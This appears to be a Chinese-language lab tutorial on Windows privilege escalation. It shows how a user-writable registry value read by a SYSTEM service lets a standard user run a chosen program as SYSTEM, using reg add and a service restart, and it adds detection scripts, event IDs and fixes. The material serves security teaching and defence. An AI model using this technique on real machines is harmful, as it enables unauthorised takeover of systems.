# Day 21：Registry ACL：能改 Registry，為什麼可能等於控制 SYSTEM？

## 開場情境

前面幾題我們已經攻破了 Windows Service 的 Object ACL（W01）、Binary ACL（W02）、Path Resolution（W03）。IT 部門全部修好了。

但這次，有個 SYSTEM Service 在啟動時會從 Registry 讀取設定。而那個 Registry Key 的 ACL……

> 你能修改 Windows 的「設定資料庫」裡某個值嗎？如果那個值控制了 SYSTEM 要執行什麼，會怎樣？

---

## 今天要解決的問題

1. Windows Registry 到底是什麼？它和檔案系統有什麼不同？
2. Registry 也有 ACL 嗎？和 NTFS ACL 差在哪？
3. 「能修改 Registry 值」就等於可以提權嗎？
4. 防禦者怎麼檢查 Registry 的 ACL？

---

## 背景知識：Windows Registry

![Windows Registry 結構](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day21-registry-acl-diagram-01.png)


Registry 是 Windows 的階層式設定資料庫。你可以把它想像成一棵巨大的樹：


幾乎所有 Windows 的行為都與 Registry 有關：Service 設定、開機程式、安全策略、應用程式設定。

### 新手先抓住這件事

> Registry 不只是「設定檔」。很多高權限程式會在啟動時讀 Registry 來決定「接下來要做什麼」。如果那個 Registry 值可以被你改，高權限程式的行為就可以被你控制。

---

## OS 原理：Registry Security Descriptor

### Registry ACL 架構

每個 Registry Key 都有一個 Security Descriptor，和檔案的 ACL 類似但完全獨立：

| 權限 | 意義 |
|------|------|
| `ReadKey` | 讀取 Key 和 Value |
| `SetValue` | 修改 Value 的資料 |
| `CreateSubKey` | 建立子 Key |
| `WriteKey` | SetValue + CreateSubKey |
| `FullControl` | 完全控制 |

### Registry ACL vs NTFS ACL

這是非常容易搞混的地方：

| 項目 | NTFS ACL | Registry ACL |
|------|----------|-------------|
| 保護對象 | 檔案和目錄 | Registry Key 和 Value |
| 檢查工具 | `icacls` | `Get-Acl Registry::HKLM\...` |
| 繼承 | 從父目錄繼承 | 從父 Key 繼承 |
| 常見疏忽 | 檔案權限過寬 | Registry Key 權限過寬 |

**重點**：`icacls` 只能看檔案，看不到 Registry ACL。要用 `Get-Acl` 或 `reg.exe`。

---

## Lab 環境

```
🔬 FEI Lab 環境
VM: FEI-PRIVESC-WINDOWS
OS: Windows 10 Pro (Build 19045)
起始帳號: fei-student (Standard User)
目標: SYSTEM
Flag: C:\FEI-PrivEsc\Flags\fei-w06-system-flag.txt
Scenario: FEI-W06-REGISTRY-ACL
```



### 場景準備

`powershell
# 1. 以 fei-labadmin 登入 Windows VM（VMware Console）
# 密碼：FEI-LabAdmin-2026!

# 2. 以系統管理員開啟 PowerShell，進入場景目錄
cd C:\FEI-PrivEsc\Scenarios\FEI-W06-REGISTRY-ACL

# 3. 執行 setup
.\fei-setup.ps1

# 4. 確認場景就緒
.\fei-verify.ps1
# 應看到 W06-REGISTRY-ACL STATUS: READY

# 5. 登出，改以 fei-student 登入
# 密碼：FEI-Student-2026!
`

### 部署過程

setup.ps1 做了什麼：

1. 建立 `FEIRegistryTrainingService`（LocalSystem）
2. Service 啟動時讀取 `HKLM\SOFTWARE\FEI\PrivEsc\W06\ActionPath`，執行該路徑的程式
3. **故意**在 Registry Key 上設定弱 ACL：`Users: WriteKey`
4. Service Object ACL、Binary ACL、ImagePath 都安全（W01/W02/W03 不成立）
5. 建立受保護的 Flag（只有 SYSTEM + Administrators 可讀）

---

## 如果我是攻擊者，我現在想知道什麼？

### 問題 1：有哪些 SYSTEM Service？

```cmd
sc qc FEIRegistryTrainingService
```

```
SERVICE_NAME: FEIRegistryTrainingService
        TYPE               : 10  WIN32_OWN_PROCESS
        BINARY_PATH_NAME   : "C:\FEI-PrivEsc\Training\W06\FEIRegistryService.exe"
        SERVICE_START_NAME : LocalSystem
```

SYSTEM Service，路徑有引號。

### 問題 2：我能改 Service 設定嗎？

```cmd
sc config FEIRegistryTrainingService binPath= "test"
```

```
[SC] OpenService 無法 5:
存取被拒。
```

W01 不成立。

### 問題 3：Binary 可以修改嗎？

```cmd
icacls "C:\FEI-PrivEsc\Training\W06\FEIRegistryService.exe"
```

```
NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
```

Users 只有 RX。W02 不成立。

### 問題 4：程式還依賴什麼設定？

```cmd
reg query "HKLM\SOFTWARE\FEI\PrivEsc\W06"
```

```
    ActionPath    REG_SZ    C:\FEI-PrivEsc\Training\W06\fei-helper.exe
```

Service 會執行 `ActionPath` 指向的程式。

### 問題 5：這個 Registry Key 的 ACL 安全嗎？

```powershell
(Get-Acl "HKLM:\SOFTWARE\FEI\PrivEsc\W06").Access | Format-Table IdentityReference, RegistryRights
```

```
IdentityReference         RegistryRights
-----------------         --------------
NT AUTHORITY\SYSTEM          FullControl
BUILTIN\Administrators       FullControl
BUILTIN\Users          SetValue, ReadKey
```

**Users 有 SetValue！** 我可以修改 `ActionPath`！

---

## Attack Reasoning

![Registry ACL Attack Reasoning](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day21-registry-acl-diagram-02.png)



---

## 實際驗證

### Step 1：修改 Registry

```cmd
reg add "HKLM\SOFTWARE\FEI\PrivEsc\W06" /v ActionPath /t REG_SZ /d "C:\FEI-PrivEsc\Training\W06\tools\fei-payload-helper.exe" /f
```

### Step 2：重啟 Service

```cmd
sc stop FEIRegistryTrainingService
sc start FEIRegistryTrainingService
```

### Step 3：讀取 Flag

```cmd
type "C:\Users\Public\fei-w06-proof.txt"
```

```
========================================
 FEI PrivEsc Lab - SYSTEM Proof
========================================
Executed as: SYSTEM
Scenario: FEI-W06-REGISTRY-ACL
Flag: FEI{WINDOWS_W06_REGISTRY_ACL_SYSTEM_ACCESS}
```

---

## Attack Path

![Registry ACL Attack Path](https://fei3363.github.io/FEI-Privilege-Escalation-Articles/articles/images/generated-diagrams/day21-registry-acl-diagram-03.png)



---

## False Positive：「Registry 可寫」不等於可以提權

看到 Registry Key 可寫就報 vulnerability？不一定。必須確認：

| 條件 | 必須成立 |
|------|---------|
| Key 被高權限 Process 讀取 | ✅ |
| Value 控制執行行為 | ✅ |
| 攻擊者可以修改 Value | ✅ |
| 攻擊者可以觸發 Process 重讀 | ✅ |

如果 Value 只控制顯示文字或 logging path，即使可寫也不是提權。

**真正危險的是**：Registry Value 控制了 executable path、command line、script path 等影響程式行為的設定。

---

## Edge Case

### SetValue vs WriteKey

在 FEI Lab 建置過程中，我們發現一個重要差異：

- `SetValue`（0x0002）：理論上可以修改 Value
- 但 `reg add` 命令實際需要 `WriteKey`（= SetValue + CreateSubKey）才能運作

這代表：即使 Registry ACL 顯示 `SetValue`，`reg add` 可能仍然 Access Denied。

```
SetValue (0x0002) → reg add 可能失敗
WriteKey (0x0006) → reg add 成功
```

### 繼承問題

父 Key 的 ACL 會繼承到子 Key。如果你在子 Key 上設定了精確 ACL 但沒有打斷繼承，父 Key 的寬鬆 ACL 可能覆蓋你的設定。

---

## Troubleshooting

| 問題 | 原因 | 解決 |
|------|------|------|
| `reg add` Access Denied | 只有 SetValue 沒有 CreateSubKey | 確認 ACL 包含 WriteKey |
| 修改後 Service 沒變化 | Service 只在啟動時讀 Registry | stop + start 重啟 |
| 找不到 Registry Key | 路徑打錯或 Key 不存在 | `reg query HKLM\SOFTWARE\FEI /s` |
| `icacls` 看不到 Registry | icacls 只看檔案 | 改用 `Get-Acl Registry::HKLM\...` |

---

## 深入一層：PowerShell `-band` 的陷阱

在建立 verify 腳本時，我們原本用 `-band` 檢查 Users 是否有 FullControl：

```powershell
# 錯誤寫法
if ($rule.RegistryRights -band [RegistryRights]::FullControl) { ... }
```

問題：`SetValue (0x0002)` 和 `FullControl (0xF003F)` 做 bitwise AND，結果非零（0x0002），所以會誤判為 FullControl！

```
SetValue:    0x00002
FullControl: 0xF003F
AND result:  0x00002  ← 非零 = 誤判為 True！
```

修正：必須用完整比對。

```powershell
# 正確寫法
if (($rule.RegistryRights -band [RegistryRights]::FullControl) -eq [RegistryRights]::FullControl) { ... }
```

---

## FEI Lab 工程筆記

### Bug 1：`-band` bitwise false positive

verify 腳本誤報 Users 有 FullControl，實際只有 SetValue。修正為 equality check。

### Bug 2：SetValue 不夠

`reg add` 需要 WriteKey（= SetValue + CreateSubKey），只給 SetValue 會 Access Denied。

### Bug 3：ACL 繼承

Bin/ 目錄的 ACL 因為繼承問題，exe 檔案意外獲得 Users:Modify。修正：先打斷繼承再設定，並強制套用到子項目。

### Bug 4：ImagePath 未引號

`sc.exe create` 的 binPath= 參數在 PowerShell 中的引號轉義問題，導致 ImagePath 沒有正確加引號。修正：直接設定 Registry 中的 ImagePath。

---

## 防禦者怎麼看？

### Detect

```powershell
# 找出 HKLM\SOFTWARE 下有 Users 寫入權限的 Key
Get-ChildItem "HKLM:\SOFTWARE" -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    $acl = $_.GetAccessControl()
    $acl.Access | Where-Object {
        $_.IdentityReference -match "Users" -and
        ($_.RegistryRights -band [System.Security.AccessControl.RegistryRights]::WriteKey) -eq [System.Security.AccessControl.RegistryRights]::WriteKey
    } | ForEach-Object { Write-Output "$($_.IdentityReference) has WriteKey on $($acl.Path)" }
}
```

### Prevent

1. 移除 Users 的 SetValue/WriteKey — 只保留 ReadKey
2. Service 依賴的 Registry Key 應由 Administrators/SYSTEM 擁有
3. 打斷不必要的 ACL 繼承

### Fix Verification

```powershell
$key = Get-Item "HKLM:\SOFTWARE\FEI\PrivEsc\W06"
$acl = $key.GetAccessControl()
$acl.Access | Where-Object { $_.IdentityReference -match "Users" }
# 應為空或只有 ReadKey
```

---

## Detection

### Event Log

- **Sysmon Event ID 13/14**：Registry value set/rename
- **Windows Security Event 4657**：Registry value modified
- 篩選：`HKLM\SOFTWARE` 下被非 Administrator 修改的 Key

### Monitoring

```
Alert: Non-admin user modifies HKLM\SOFTWARE\<ServiceName>\*
```

---

## Exercise

1. 在你自己的 Windows 機器上，找出 `HKLM\SOFTWARE` 底下有哪些 Key 的 ACL 包含 Users 的寫入權限
2. 對其中一個 Key，分析：是否有高權限 Process 讀取它的值？那個值控制什麼行為？
3. 比較 W01（Service ACL）和 W06（Registry ACL）：兩者的 Trust Surface 有什麼不同？

---

## Quiz

**Q1**：`icacls` 可以檢查 Registry ACL 嗎？

### 答案
不行。`icacls` 只能檢查 NTFS 檔案和目錄的 ACL。Registry ACL 需要用 `Get-Acl Registry::HKLM\...` 或 PowerShell Registry Provider。


**Q2**：Service 的 Registry Key 有 `Users: SetValue`，就一定可以用 `reg add` 修改值嗎？

### 答案
不一定。`reg add` 實際需要 WriteKey 權限（= SetValue + CreateSubKey）。只有 SetValue 的話，`reg add` 可能仍然 Access Denied。


**Q3**：修改了 Registry 值後，正在運行的 Service 會立即改變行為嗎？

### 答案
不一定。大多數 Service 只在啟動時讀取 Registry。需要停止再重新啟動 Service，修改才會生效。




## 場景收尾

做完後記得 reset：

`powershell
# 以 fei-labadmin 的系統管理員 PowerShell
cd C:\FEI-PrivEsc\Scenarios\FEI-W06-REGISTRY-ACL
.\fei-reset.ps1
.\fei-verify.ps1 -Mode reset
# 應看到 W06-REGISTRY-ACL STATUS: RESET
`

---

## 今天真正要記住的 3 件事

1. **Registry ACL 是獨立的安全層** — 和 NTFS ACL 完全不同，需要用不同工具檢查
2. **「能修改 Registry 值」只是第一步** — 還要問：誰讀它？以什麼權限？控制什麼行為？
3. **Windows 設定不只存在檔案裡** — Registry 是另一個重要的 Trust Surface

---

## 給自己的問題

> 如果 Service ACL 安全、Binary ACL 安全、Registry ACL 安全……但 Service 啟動時還會載入某個 DLL，那又怎樣？

---

## 下一篇

Day 22：不用漏洞，也能從 User 走到 Local Admin — Windows Credential Hunting。而且這次的目標不是 SYSTEM。
